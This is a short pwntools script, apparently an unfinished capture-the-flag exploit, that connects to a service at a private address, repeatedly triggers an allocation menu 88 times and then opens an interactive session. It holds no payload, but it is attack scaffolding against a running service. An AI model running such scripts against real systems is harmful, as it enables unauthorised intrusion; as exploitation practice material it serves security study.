from pwn import *

s = remote('192.168.0.85',1234)
raw_input()
def stack(size,name):
  s.recvuntil('choice:')
  s.send('1\n')
  s.recvuntil('Size :')
  s.send(str(size)+'\n')
  s.recvuntil('allocator ? :')
  s.send(name+'\n')
def heap(size,name):
  s.recvuntil('choice:')
  s.send('1\n')
  s.recvuntil('Size :')
  s.send(str(size)+'\n')
  s.recvuntil('allocator ? :')
  s.send(name+'\n')
def create():
  s.recvuntil('choice:')
  s.send('4\n')
for i in xrange(88): 
  print i
  stack(0xfff,'1234')
  create()
s.interactive()
